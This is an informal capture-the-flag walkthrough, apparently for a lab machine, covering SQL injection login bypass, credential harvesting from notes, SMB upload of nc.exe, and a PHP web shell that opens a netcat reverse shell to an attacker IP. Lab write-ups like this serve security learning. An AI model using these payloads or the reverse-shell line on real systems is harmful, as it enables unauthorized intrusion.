# Windows Subsystem for Linux

It is use to run linux in windows with or without the VMs. 

Now we want to get some initial foothold to the machine. Moving to the port 80 to see the website, it contains a login page so we are registering new account and login to it. And in the contact us their given a mail `tyler@randome.com` it gives the username. The username enumeration is done in new registeration because it cannot allow the username as duplicate and says the username is already taken 

and by logining with the username and password using sql injection 

```
// credentials 
username and password - 'OR 1 OR'
```

Now we can see all the users notes in that the user tyler has the note of his credentials and name of smb folder and now using the psexec.py to get the initial access 

We have two website one in port 80 and other in the port 8880, port 8880 has direct access to smb 
```
psexec.py tyler:'his_password'@ip_address 

// it is blocked may be due to the antivirus or firewall so we got the credentials of tyler now we going to use the smb and got into it 
smbclient \\\\ip_address\\new-site -U tyler 

// we have nc.exe in the kali machine and uploading in the smb folder 
put nc.exe 

// uploading the reverse shell in the php with a filename (reverse.php)
<?php system('nc.exe -e cmd.exe attacker_ip port')?>

// upload the reverse shell 
put reverse.php

// now visiting the target site give us reverse shell 
https://target.site/reverse.php 

// we got the initial access 
systeminfo - with error : Access Denied

// we can't access efficiently so checking for the antivirus software and found the windows defender is up  
sc query windefend 
```
